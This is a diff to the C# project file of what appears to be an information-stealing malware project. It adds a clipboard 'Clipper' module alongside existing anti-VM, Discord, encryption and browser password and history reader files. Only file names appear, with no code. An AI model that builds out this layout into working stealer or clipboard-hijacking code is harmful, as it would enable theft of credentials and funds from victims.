@@ -91,6 +91,7 @@
   </ItemGroup>
   <ItemGroup>
     <Compile Include="AntiVM.cs" />
+    <Compile Include="config.cs" />
     <Compile Include="Decryptor.cs" />
     <Compile Include="Discord.cs" />
     <Compile Include="Encryptor.cs" />
@@ -98,12 +99,16 @@
     <Compile Include="JSON.cs" />
     <Compile Include="Lepakko.cs" />
     <Compile Include="Logger.cs" />
+    <Compile Include="modules\Clipper\Clipboard.cs" />
     <Compile Include="modules\Helpers\SQLite.cs" />
     <Compile Include="modules\Helpers\Utils.cs" />
     <Compile Include="modules\Helpers\Profile.cs" />
     <Compile Include="modules\Helpers\Json.cs" />
     <Compile Include="modules\Helpers\Decryptor.cs" />
     <Compile Include="modules\Helpers\Common.cs" />
+    <Compile Include="modules\Clipper\Monitor.cs" />
+    <Compile Include="modules\Clipper\Mutex.cs" />
+    <Compile Include="modules\Clipper\Patterns.cs" />
     <Compile Include="modules\Reader\Bookmarks.cs" />
     <Compile Include="modules\Reader\Passwords.cs" />
     <Compile Include="modules\Reader\History.cs" />
